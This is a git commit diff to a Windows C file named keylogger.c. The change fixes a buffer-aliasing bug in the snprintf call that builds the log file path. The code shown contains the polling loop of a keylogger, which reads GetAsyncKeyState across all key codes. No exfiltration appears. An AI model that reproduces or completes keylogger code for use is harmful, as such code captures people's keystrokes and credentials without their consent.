1ad7a349a65a58c02ef96343edcc44849a6f8bf7
cybersecuritydef <155002701+cybersecuritydef@users.noreply.github.com>
2026-05-29 18:53:42 +0300

    Update keylogger.c

--- keylogger.c
+++ keylogger.c
@@ -13,9 +13,10 @@ int main(int argc, char **argv){
     int state = 0;
     setlocale(LC_ALL, "Russian");
     char path[LEN_NAME] = {'\0'};
+    char fullpath[LEN_NAME] = {'\0'};
     GetModuleFileName(NULL, path, LEN_NAME - 1);
     PathRemoveFileSpec(path);
-    snprintf(path, LEN_NAME, "%s\\%s", path, KEY_LOG);
+    snprintf(fullpath, LEN_NAME - 1, "%s\\%s", path, KEY_LOG);
     while(true){
         for(i = 0; i < 255; i++){
             state = GetAsyncKeyState(i);
